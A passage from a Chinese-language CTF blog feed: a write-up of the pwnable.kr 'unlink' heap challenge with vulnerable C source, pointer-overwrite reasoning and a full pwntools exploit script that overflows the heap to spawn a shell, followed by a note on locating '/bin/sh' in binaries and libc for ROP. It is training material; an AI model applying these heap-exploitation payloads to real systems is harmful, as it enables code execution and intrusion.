alt="2.jpg"></p><pre><code>FD=P-&gt;fd即当前空闲chunk所指向的下一个空闲chunkBK=P-&gt;bk即当前空闲chunk所指向的上一个chunkFD-&gt;bk=BK&lt;=&gt;P-&gt;fd-&gt;bk= P-&gt;bkBK-&gt;fd=FD&lt;=&gt;P-&gt;bk-&gt;fd= P-&gt;fd</code></pre><h4 id="unlink引发漏洞原理"><a href="#unlink引发漏洞原理" class="headerlink" title="unlink引发漏洞原理"></a>unlink引发漏洞原理</h4><p><strong>Dword shoot</strong>一种漏洞溢出技巧。漏洞是在双向链表chunk删除时，出现的一种漏洞类型。在进行双向链表的操作过程中，有溢出等的情况下，删除的chunk的fd、bk两个指针被恶意的改写的话，就会在链表删除的时候发生的漏洞。<img src="https://img-blog.csdnimg.cn/20190414200335569.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0Nob3BwZXJDUA==,size_16,color_FFFFFF,t_70" alt="img"></p><p>unlink 卸载chunk时，会对chunk 的fd、bk指针进行操作，就是因为这个操作我们可以利用堆溢出控制，进行unlink的chunk的fd、bk指针。</p><p>如果双向链表的2个指针被修改的话，一般由于修改数据，或者控制程序的跳转。shellcode无法放入这么小的空间中。</p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> &amp;lt;stdio.h&amp;gt;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> &amp;lt;stdlib.h&amp;gt;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> &amp;lt;string.h&amp;gt;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagOBJ</span>&#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tagOBJ</span>* <span class="title">fd</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tagOBJ</span>* <span class="title">bk</span>;</span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">8</span>];</span><br><span class="line">&#125;OBJ;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">system(&amp;quot;/bin/sh&amp;quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">unlink</span><span class="params">(OBJ* B)</span></span>&#123;</span><br><span class="line">OBJ* BK;</span><br><span class="line">OBJ* FD;</span><br><span class="line"></span><br><span class="line">BK=B-&amp;gt;bk;FD=B-&amp;gt;fd;</span><br><span class="line"></span><br><span class="line">FD-&amp;gt;bk=BK;BK-&amp;gt;fd=FD;</span><br><span class="line"><span class="comment">//[B-&amp;gt;bk]-&amp;gt;fd被B-&amp;gt;fd值覆写</span></span><br><span class="line"><span class="comment">//[B-&amp;gt;fd]-&amp;gt;bk被B-&amp;gt;bk覆写</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">1024</span>);</span><br><span class="line">OBJ* A = (OBJ*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(OBJ));</span><br><span class="line">OBJ* B = (OBJ*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(OBJ));</span><br><span class="line">OBJ* C = (OBJ*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(OBJ));</span><br><span class="line"></span><br><span class="line"><span class="comment">// double linked list: A &amp;lt;-&amp;gt; B &amp;lt;-&amp;gt; C</span></span><br><span class="line">A-&amp;gt;fd = B;</span><br><span class="line">B-&amp;gt;bk = A;</span><br><span class="line">B-&amp;gt;fd = C;</span><br><span class="line">C-&amp;gt;bk = B;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(&amp;quot;here is <span class="built_in">stack</span> address leak: %p\n&amp;quot;, &amp;amp;A);</span><br><span class="line"><span class="built_in">printf</span>(&amp;quot;here is heap address leak: %p\n&amp;quot;, A);</span><br><span class="line"><span class="built_in">printf</span>(&amp;quot;now that you have leaks, get shell!\n&amp;quot;);</span><br><span class="line"><span class="comment">// heap overflow!</span></span><br><span class="line">gets(A-&amp;gt;buf);</span><br><span class="line"></span><br><span class="line"><span class="comment">// exploit this unlink!</span></span><br><span class="line">unlink(B);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>概述一下程序运行思路：申请ABC三个大小为0x10的chunk；将ABC之间相互串联起来，形成一个空闲chunk链表（链接方式看下图）。接着答应出chunk A的栈地址、堆地址。之后从A buf后写入我们输入的数据，对B调用unlink函数，将B在链表上卸载下来。</p><p><img src="https://i.loli.net/2019/09/29/U1NvB3YsmtbJXDH.png"></p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>最明显的一点就是<code>get(A-&gt;buf)</code>存在堆溢出的情况。结合题目给予我们的提示：unlink。存在溢出和有unlink出现，我们就能构造出两个任意指向的指针（fd、bk）。</p><p>我们先来看看unlink函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">unlink</span><span class="params">(OBJ* B)</span></span>&#123;</span><br><span class="line">OBJ* BK;</span><br><span class="line">OBJ* FD;</span><br><span class="line"></span><br><span class="line">BK=B-&amp;gt;bk;</span><br><span class="line">    FD=B-&amp;gt;fd;</span><br><span class="line">FD-&amp;gt;bk=BK;</span><br><span class="line">    BK-&amp;gt;fd=FD;</span><br><span class="line"><span class="comment">//[B-&amp;gt;bk]-&amp;gt;fd被B-&amp;gt;fd值覆写</span></span><br><span class="line"><span class="comment">//[B-&amp;gt;fd]-&amp;gt;bk被B-&amp;gt;bk覆写</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们先来解读一下unlink是怎么释放一个chunk的。我们就用下图中堆块解释：</p><p><img src="https://i.loli.net/2019/09/29/zTsGIFCKBnh32lP.png"></p><p>我们先将四条转换方程式化简一下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">B-&gt;fd-&gt;bk &#x3D; B-&gt;bk</span><br><span class="line">B-&gt;bk-&gt;fd &#x3D; B-&gt;fd</span><br></pre></td></tr></table></figure><p><code>B-&gt;bk</code>   =   <code>0x1030</code>；<code>B-&gt;fd</code>   =   <code>0x1010</code>；都是存储着内存地址的变量。换句话说就是<code>B-&gt;bk</code> <code>B-&gt;fd</code>都是地址值。</p><p><code>B-&gt;fd-&gt;bk </code>   =   <code>*((B-&gt;fd)+bk)</code>   =<code>*(0x1010+4)</code>；<code>B-&gt;bk-&gt;fd</code>   =   <code>*((B-&gt;bk)+fd)</code>   =   <code>*(0x1030+0)</code>；可以看见现在变成了指针，而不是上面的地址值，而是一个指针。</p><p>那么最后的运算结果是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*(<span class="number">0x1010</span>+<span class="number">4</span>) = <span class="number">0x1030</span><span class="comment">//0x1014（前一个chunk的bk）的值被覆盖为0x1010</span></span><br><span class="line">*(<span class="number">0x1030</span>+<span class="number">0</span>) = <span class="number">0x1010</span><span class="comment">//0x1030（后一个chunk的fd）的值被覆盖为0x1010</span></span><br></pre></td></tr></table></figure><p>unlink之后的chunk指针就如同最下行所示。</p><p><img src="https://anquan.baidu.com/upload/ue/image/20190222/1550819912485582.jpg" alt="2.jpg"></p><p>我们初定的利用思路是：利用unlink和堆溢出，创造出两个所我们所控制的任意指针，然后将程序控制流控制到shell上。将shellcode写到堆上，然后覆盖返回指针到堆上的方法不可行。因为程序开启了NX，堆栈上数据不能运行。而且程序中也有现成的shell。</p><p><img src="https://images2015.cnblogs.com/blog/1071926/201707/1071926-20170714154547056-1917497079.png" alt="img"></p><p>做到这里就有点进行不下去，主要是不知覆盖那个函数的返回地址，来控制程序流。查看别人writeup，发现关键点在这里：</p><p><img src="https://i.loli.net/2019/09/29/y8r4QgXz3GUmIHc.png"></p><ul><li><p><code>retn</code></p><p>retn指令作用是栈顶字单元出栈，其赋值给EIP寄存器，只要能够修改ESP寄存器的内容修改为shellcode的地址就能执行shellcode。</p></li><li><p><code>lea esp,[ecx-4]</code></p><p>lea指令将存储器操作数mem的4位16进制偏移地址送到指定的寄存器。eg：SI=1000H，执行指令 LEA BX , [SI] 后，BX=1000H。也就是说esp的值来自[ecx-4]指向的值 。</p></li><li><p><code>leave</code></p><p>leave指令相当于mov esp ebp，pop ebp，对esp数据的来源无影响。</p></li><li><p><code>mov ecx,[ebp+var_4]</code>相当于<code>mov ecx,[ebp-4]</code></p><p>ecx等于[ebp-4]指向的值，也就是我们需要将[ebp-4]指向的值修改为shellcode+4</p></li></ul><p>还记得我们已经分析得到的条件：<strong>可以利用堆溢出和unlind创造出两个指针</strong>。（ebp的值在程序运行时值不变）</p><p>我们就将其中的一个任意指针修改为<code>*(ebp-4)</code>，将ebp-4的值覆写为shellcode+4。</p><p>那我们先找出shellcode 和 ebp的内存地址：</p><ul><li><p>IDA函数表中找到shellcode地址：</p><p><img src="https://i.loli.net/2019/09/29/RxZXovqD6PMCFjf.png"></p></li><li><p>程序会将chunk A的栈地址和堆地址，而栈地址是用ebp计算偏移得到的。IDA中查看chunk A栈地址的偏移算法：</p><p><img src="https://i.loli.net/2019/09/29/6iAwIYcbFXzE8Bf.png"></p><p>chunk A stack addr = ebp+var_14 = ebp - 0x14</p></li></ul><p>从这里就可以推算出ebp - 0x4 相对于的chunk A 栈地址的相对位置，进而推算出实际内存地址。</p><p>shellcode的地址，我们需要找一个地址放置。方便我们构建的任意地址指针读取到ebp-0x4中。那么，我们就一齐写入到chunk A 堆中。</p><hr><p>接下来就是看看构造指针的fd、bk需要填入什么数。unlink 的计算方程：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">B-&amp;gt;bk-&amp;gt;fd = B-&amp;gt;fd</span><br><span class="line">B-&amp;gt;fd-&amp;gt;bk = B-&amp;gt;bk</span><br><span class="line"></span><br><span class="line">*(<span class="number">0x1030</span>+<span class="number">0</span>) = <span class="number">0x1010</span><span class="comment">//0x1030（后一个chunk的fd）的值被覆盖为0x1010 </span></span><br><span class="line">*(<span class="number">0x1010</span>+<span class="number">4</span>) = <span class="number">0x1030</span><span class="comment">//0x1014（前一个chunk的bk）的值被覆盖为0x1010</span></span><br></pre></td></tr></table></figure><p>我们利用第一个指针进行写入，也就是：<code>*(bk+0)=fd</code>。换而言之就是<code>*(ebp-4)=shellcode-4</code>。</p><p>得出我们需要填入的是fd = chunk A堆地址+12；bk = chunk A栈地址 + 0x10</p><p>初始情况下的chunk A :</p><p>data A on heap:</p><p>———————————     &lt;=A</p><p>|       FD       |      BK       |    </p><p>———————————     &lt;=A-&gt;buf , A+0x8</p><p>|   put shellcode here     |</p><p>|    length of buf is 0x8   |</p><p>———————————     </p><p>| presizeB    |     sizeB    |    </p><p>———————————     &lt;=B , A+0x8+0x8+0x8</p><p>|       FD       |      BK       |    </p><p>———————————     &lt;=B-&gt;buf</p><p>|                                      |</p><p>———————————</p><p>好，我们现在构造payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># &amp;#039;a&amp;#039;用作填充chunk A剩余空间到达chunk B堆顶；</span><br><span class="line">payload &#x3D; p32(shell_addr)+&amp;#039;a&amp;#039;*12+p32(heap_addr + 12)+p32(stack_addr + 0x10)</span><br></pre></td></tr></table></figure><p>溢出覆写之后的chunk A：</p><p>data A on heap:</p><p>———————————     &lt;=A</p><p>|       FD       |      BK       |    </p><p>———————————     &lt;=A-&gt;buf , A+0x8</p><p>|    shellcode (4 byte)     |</p><p>|   AAAA (4 byte junk)    |</p><p>———————————     </p><p>|   AAAA      |    AAAA     |    </p><p>———————————     &lt;=B , A+0x8+0x8+0x8</p><p>|A heap +12|A stack+0x10|    </p><p>———————————     &lt;=B-&gt;buf</p><p>|                                      |</p><p>———————————</p><p>接下来调用unlink及其后面指令的原理简单记录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;unlink之后得到的两条方程</span><br><span class="line">*（（A stack+0x10）+ 0）&#x3D; A heap +12</span><br><span class="line">*（（A heap +12） + 4）&#x3D; A stack+0x10</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;指针一化简得到</span><br><span class="line">*(ebp-0x14+0x10+0)&#x3D;shellcode + 0x4</span><br><span class="line">&#x2F;&#x2F;ebp-0x4指向的值被覆写为shellcode + 0x4</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;ebp-0x4指向的值shellcode+4被传入ecx</span><br><span class="line">mov ecx,[ebp+var_4]</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;ecx-4指向的shellcode开始行被传入到esp中（shellcode+4-4）</span><br><span class="line">lea esp,[ecx-4]</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;退出main，但是eip被修改为shellcode开始运行行，变成了运行shellcode</span><br><span class="line">retn</span><br></pre></td></tr></table></figure><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = &amp;<span class="comment">#039;debug&amp;#039;</span></span><br><span class="line">shell_addr = <span class="number">0x080484eb</span><span class="comment">#IDA函数列表可查得</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 与服务器建立ssh链接</span></span><br><span class="line">s =  ssh(host=&amp;<span class="comment">#039;pwnable.kr&amp;#039;,</span></span><br><span class="line">         port=<span class="number">2222</span>,</span><br><span class="line">         user=&amp;<span class="comment">#039;unlink&amp;#039;,</span></span><br><span class="line">         password=&amp;<span class="comment">#039;guest&amp;#039;</span></span><br><span class="line">        )</span><br><span class="line">p = s.process(&amp;quot;./unlink&amp;quot;) <span class="comment"># 加载程序</span></span><br><span class="line"><span class="comment"># 获取 A 栈地址</span></span><br><span class="line">p.recvuntil(&amp;quot;here <span class="keyword">is</span> stack address leak: &amp;quot;)</span><br><span class="line">stack_addr = p.recv(<span class="number">10</span>)</span><br><span class="line">stack_addr = <span class="built_in">int</span>(stack_addr,<span class="number">16</span>)</span><br><span class="line"><span class="comment"># 获取 A 堆地址</span></span><br><span class="line">p.recvuntil(&amp;quot;here <span class="keyword">is</span> heap address leak: &amp;quot;)</span><br><span class="line">heap_addr = p.recv(<span class="number">9</span>)</span><br><span class="line">heap_addr = <span class="built_in">int</span>(heap_addr,<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">payload = p32(shell_addr)+&amp;<span class="comment">#039;a&amp;#039;*12+p32(heap_addr + 12)+p32(stack_addr +16)</span></span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="blog.csdn.net/qq_33528164/article/details/77061932">全面剖析Pwnable.kr unlink</a></p><p><a href="blog.sina.com.cn/s/blog_d18fc6010102x4l4.html">pwnable.kr unlink</a></p><p><a href="jianshu.com/p/90c5e76cae2e">pwnable.kr之unlink</a></p><p><a href="https://www.cnblogs.com/liuyimin/articles/7381018.html">pwnable.kr unlink之write up</a></p><p><a href="https://www.cnblogs.com/p4nda/p/7172104.html">【pwnable.kr】 unlink</a></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Pwnable.kr </tag>
            
            <tag> unlink </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn题查找字符串方法记录</title>
      <link href="archives/63f1c6b0/"/>
      <url>archives/63f1c6b0/</url>
      
        <content type="html"><![CDATA[<blockquote><p>记忆力不太好，简单记录一下，用作备忘<br>假设现在有文件如下：</p></blockquote><ul><li>待 Pwn 程序：mypwn</li><li>libc 文件：libc.so</li></ul><p>需要查找的字符串 <code>/bin/sh</code> 在上诉两个文件中都存在。</p><h1 id="查找程序中的字符串"><a href="#查找程序中的字符串" class="headerlink" title="查找程序中的字符串"></a>查找程序中的字符串</h1><h2 id="0x0-IDA-strings-window"><a href="#0x0-IDA-strings-window" class="headerlink" title="0x0 IDA strings window"></a>0x0 IDA strings window</h2><p>将程序加载到 IDA 后，使用快捷键 <code>shift+F12</code> 打开 strings window ，查看程序中出现的全部字符。</p><p><img src="https://mrskye.cn-gd.ufileos.com/img/2020-04-04-GS4Z12OviupFCU5f.png"></p><h2 id="0x1-Linux-strings-命令"><a href="#0x1-Linux-strings-命令" class="headerlink" title="0x1 Linux strings 命令"></a>0x1 Linux strings 命令</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">strings -a -t x mypwn | grep &#x27;/bin/sh&#x27;</span><br><span class="line">&amp;gt; 540</span><br></pre></td></tr></table></figure><p>返回的是地址最低 3 位。因为就算随机化，最低 3 位地址也保持不变。</p><h2 id="0x2-ROPgadget"><a href="#0x2-ROPgadget" class="headerlink" title="0x2 ROPgadget"></a>0x2 ROPgadget</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary mypwn --string &#x27;/bin/sh&#x27;</span><br></pre></td></tr></table></figure><h2 id="0x3-pwntools-search-方法"><a href="#0x3-pwntools-search-方法" class="headerlink" title="0x3 pwntools search 方法"></a>0x3 pwntools search 方法</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./mypwn&#x27;</span>)</span><br><span class="line">binsh = p.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br></pre></td></tr></table></figure><blockquote><p><del>pwntools 中用 ELF 加载程序(mypwn)后，elf 对象有一个 search 方法好像也可以查找字符串，未实测。</del></p></blockquote><h1 id="查找-libc-中的字符串"><a href="#查找-libc-中的字符串" class="headerlink" title="查找 libc 中的字符串"></a>查找 libc 中的字符串</h1><h2 id="0x0-pwntools-search-方法"><a href="#0x0-pwntools-search-方法" class="headerlink" title="0x0 pwntools search 方法"></a>0x0 pwntools search 方法</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so&#x27;</span>)</span><br><span class="line">binsh = libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line"><span class="comment"># 这个地址不是真实地址，使用时还需要加上偏移</span></span><br><span class="line"><span class="comment"># 即一般情况下进行下面的处理后，才能正常使用</span></span><br><span class="line">binsh_addr = binsh + libc_base<span class="comment"># 泄露的libc基地址</span></span><br></pre></td></tr></table></figure><h2 id="0x1-libcSearch"><a href="#0x1-libcSearch" class="headerlink" title="0x1 libcSearch"></a>0x1 libcSearch</h2><p>使用 libcSearch 之前需要泄露出地址，以初始化 libcSearch 。这里假设泄露出 puts 地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">libc = LibcSearch(<span class="string">&#x27;puts&#x27;</span>,puts_leak)</span><br><span class="line">binsh = libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"><span class="comment"># 这个地址不是真实地址，使用时还需要加上偏移</span></span><br><span class="line"><span class="comment"># 即一般情况下进行下面的处理后，才能正常使用</span></span><br><span class="line">binsh_addr = binsh + libc_base<span class="comment"># 泄露的libc基地址</span></span><br></pre></td></tr></table></figure><h2 id="0x2-ROPgadget-1"><a href="#0x2-ROPgadget-1" class="headerlink" title="0x2 ROPgadget"></a>0x2 ROPgadget</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary libc.so --string &#x27;/bin/sh&#x27;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> Trick </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 查找字符串 </tag>
            
            <tag> LibcSearch </tag>
            
            <tag> ROPgadget </tag>
            
            <tag> pwntools </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
